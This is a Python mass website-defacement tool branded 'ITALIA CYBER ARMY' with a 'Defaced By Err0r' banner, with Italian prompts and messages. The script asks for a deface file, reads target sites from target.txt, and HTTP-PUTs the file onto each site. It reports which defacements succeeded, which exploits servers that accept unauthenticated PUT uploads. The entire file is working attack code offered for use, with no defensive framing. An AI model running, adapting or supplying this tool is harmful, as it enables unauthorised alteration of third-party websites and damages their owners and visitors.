#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests and try again ...")

banner = """


                      ___                     ___              
                     (   )               .-. (   )             
 ___  ___  ___  .--.  | |.-.      .--.  ( __) | |_      .--.   
(   )(   )(   )/    \ | /   \   /  _  \ (''")(   __)   /    \  
 | |  | |  | ||  .-. ;|  .-. | . .' `. ; | |  | |     |  .-. ; 
 | |  | |  | ||  | | || |  | | | '   | | | |  | | ___ |  | | | 
 | |  | |  | ||  |/  || |  | | _\_`.(___)| |  | |(   )|  |/  | 
 | |  | |  | ||  ' _.'| |  | |(   ). '.  | |  | | | | |  ' _.' 
 | |  ; '  | ||  .'.-.| '  | | | |  `\ | | |  | ' | | |  .'.-. 
 ' `-'   `-' ''  `-' /' `-' ;  ; '._,' ' | |  ' `-' ; '  `-' / 
  '.__.'.__.'  `.__.'  `.__.    '.___.' (___)  `.__.   `.__.'  
     ___          .-.                                          
    (   )        /    \                                        
  .-.| |  .--.   | .`. ;  .---.   .--.     .--.  ___ .-.       
 /   \ | /    \  | |(___)/ .-, \ /    \   /    \(   )   \      
|  .-. ||  .-. ; | |_   (__) ; ||  .-. ; |  .-. ;| ' .-. ;     
| |  | ||  | | |(   __)   .'`  ||  |(___)|  | | ||  / (___)    
| |  | ||  |/  | | |     / .'| ||  |     |  |/  || |           
| |  | ||  ' _.' | |    | /  | ||  | ___ |  ' _.'| |           
| '  | ||  .'.-. | |    ; |  ; ||  '(   )|  .'.-.| |           
' `-'  /'  `-' / | |    ' `-'  |'  `-' | '  `-' /| |           
 `.__,'  `.__.' (___)   `.__.'_. `.__,'   `.__.'(___)          
                                                               

                    ITALIA CYBER ARMY

                                                               
                       .,,uod8B8bou,,.
              ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
         ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
         !...:!TVBBBRPFT||||||||||!!^^""'   ||||
         !.......:!?|||||!!^^""'            ||||
         !.........||||                     ||||
         !.........||||  ##Defaced          ||||
         !.........||||                     ||||
         !.........||||      By             ||||
         !.........||||                     ||||
         !.........||||    Err0r            ||||
         `.........||||                    ,||||
          .;.......||||               _.-!!|||||
   .,uodWBBBBb.....||||       _.-!!|||||||||!:'
!YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb....
!..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
!....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
!......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^"`;:::       `.
!........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
`..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
  `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
    `........::::::::::::::::;iof688888888888888888888b.     `
      `......:::::::::;iof688888888888888888888888888888b.
        `....:::;iof688888888888888888888888888888888899fT!
          `..::!8888888888888888888888888888888899fT|!^"'
            `' !!988888888888888888888888899fT|!^"'
                `!!8888888888888888899fT|!^"'
                  `!988888888899fT|!^"'
                    `!9899fT|!^"'
                      `!^"'
"""

b = '\033[1;91m'
h = '\033[1;92m'
m = '\033[00m'

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("File in Upload su %d Website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" Defacciamento Fallito!"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" Defacciamento Eseguito"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("Selezionare il File di Defacciamento: ")
         if not os.path.isfile(a):
            print("File '%s' Non Trovato"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)

if __name__ == "__main__":
    main(banner)
